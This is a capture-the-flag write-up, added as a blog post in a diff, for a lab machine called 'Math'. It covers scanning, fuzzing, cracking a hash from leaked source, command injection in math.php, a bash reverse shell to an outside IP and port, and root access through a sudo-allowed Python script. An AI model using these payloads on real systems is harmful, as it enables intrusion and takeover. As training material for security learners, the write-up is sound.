@@ -1,0 +1,135 @@
+---
+title: 'Math Writeup'
+date: '2025-01-07'
+tags: ['Function Injection', 'RCE', 'Linux', 'Hacking Club']
+draft: false
+summary: 'Application has exposed credentials vulnerability, Function Injection leading to RCE, improper use of eval() in Python, and privilege escalation via verify.py script.'
+images: ['/static/images/math-writeup-images/default.png']
+authors: ['default']
+---
+
+![logo](/static/images/math-writeup-images/default.png)
+
+---
+
+### Port Scanning
+
+`nmap -sV -sC -p- -v $IP --open -T 5`
+
+![math](/static/images/math-writeup-images/image.png)
+
+Only ports 22 (SSH) and 80 (HTTP) are open.
+
+---
+
+## Enumeration
+
+`http://172.16.1.79`
+
+![math 1](/static/images/math-writeup-images/image1.png)
+
+I tested SQL Injection and default credentials on this login page, but without success.
+
+### Fuzzing
+
+```
+ffuf -w /usr/share/seclists/Fuzzing/fuzz-Bo0oM.txt -u http://172.16.1.79/FUZZ -e .php .txt .log .zip .py -ic
+```
+
+![math 2](/static/images/math-writeup-images/image2.png)
+
+File `backup.zip` was found.
+
+![math 3](/static/images/math-writeup-images/image3.png)
+
+After downloading it, we can see it contains the source code of the application.
+
+Hardcoded hash found inside the source code.
+
+![math 4](/static/images/math-writeup-images/image4.png)
+
+I used John the Ripper to crack the hash.
+
+```
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+```
+
+![math 5](/static/images/math-writeup-images/image5.png)
+
+Credencial `f4:1q2we`
+
+With that, we can log into the application.
+
+The application is a website under development meant to help students solve math operations.
+
+![math 6](/static/images/math-writeup-images/image6.png)
+
+### Code Review
+
+![math 7](/static/images/math-writeup-images/image7.png)
+
+If the `page` parameter is set and the value is `math`, we are redirected to `/math.php`.
+
+Analyzing the `math.php` file, we can see we have control over the math operations that the application performs.
+
+![math 8](/static/images/math-writeup-images/image8.png)
+
+### Function Injection
+
+Knowing we control the parameters and the application lacks sanitization, we can exploit the function like this:
+
+`/math.php?operation=system&firstNum=id&secondNum=1`
+
+![math 9](/static/images/math-writeup-images/image9.png)
+
+---
+
+## Foot Hold
+
+`/math.php?operation=system&firstNum=bash -c 'exec bash -i &>/dev/tcp/10.0.31.150/1337 <&1'&secondNum=1`
+
+Note: Don’t forget to encode the payload.
+
+![math 10](/static/images/math-writeup-images/image10.png)
+
+`nc -lnvp 1337`
+
+![math 11](/static/images/math-writeup-images/image11.png)
+
+![math 12](/static/images/math-writeup-images/image12.png)
+
+---
+
+## Privillege Escalation
+
+Inside the `/home/f4` directory, we can see a note revealing his password.
+
+![math 13](/static/images/math-writeup-images/image13.png)
+
+![math 14](/static/images/math-writeup-images/image14.png)
+
+`sudo -l`
+
+![math 15](/static/images/math-writeup-images/image15.png)
+
+We can see the user is allowed to run the `verify.py` script as root without a password.
+
+`cat verify.py`
+
+![math 16](/static/images/math-writeup-images/image16.png)
+
+Basically, the script reads a file and checks if it exists.
+
+Knowing this, we’ll make it read the `/bin/bash` file, which will grant us root privileges on the machine.
+
+```python
+__import__('os').system('/bin/bash')
+```
+
+![math 17](/static/images/math-writeup-images/image17.png)
+
+---
+
+## Proof
+
+![math 18](/static/images/math-writeup-images/image18.png)
